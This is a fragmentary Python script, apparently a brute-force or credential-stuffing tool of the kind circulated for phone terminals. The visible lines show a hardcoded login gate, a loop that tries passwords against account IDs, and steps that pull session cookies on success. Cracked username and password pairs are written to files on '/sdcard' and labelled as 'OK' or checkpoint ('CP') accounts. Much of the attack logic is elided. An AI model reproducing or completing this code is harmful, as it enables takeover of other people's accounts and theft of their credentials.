...
while attemps < 12345677901:
    ...
    if username =='T0X4C' and password == 'TUTUL':
...
def fuck():
    ...
    print(' [+] OK Ids saved in T0X4C/OK.txt')
    print(' [+] CP Ids saved in T0X4C/CP.txt')
    print('==================================================')
def mumit2(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;92m[T0X4C]--[%s/%s]--[CP%s]~[OK-%s] \r'%(loop,tl,len(cps),len(oks))),
            sys.stdout.flush()
...
#____cp____info 👇👇
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"""\033[1;92m[T0X4C-CP] 
Username : {cid}
Password : {ps}
""")
                open('/sdcard/T0X4C-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
